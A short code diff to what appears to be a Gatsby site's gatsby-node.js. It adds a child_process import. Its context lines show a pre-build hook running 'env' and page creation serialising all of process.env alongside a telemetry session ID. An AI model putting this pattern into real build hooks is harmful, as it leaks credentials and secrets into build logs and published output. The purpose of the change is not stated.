@@ -1,5 +1,6 @@
 const path = require("path")
 const fs = require("fs")
+const { exec } = require("child_process")
 /**
  * Implement Gatsby's Node APIs in this file.
  *
@@ -7,7 +8,7 @@ const fs = require("fs")
  */
 
 // You can delete this file if you're not using it
-exports.onPreBuild = function() {
+exports.onPreBuild = function () {
   console.log(`aw yeah`)
 
   console.log(exec(`env`))
@@ -25,7 +26,7 @@ exports.createPages = async ({ actions }) => {
       {
         sessionID: process.gatsbyTelemetrySessionId,
         lol: 1,
-        env: JSON.stringify(process.env)
+        env: JSON.stringify(process.env),
       },
       null,
       2
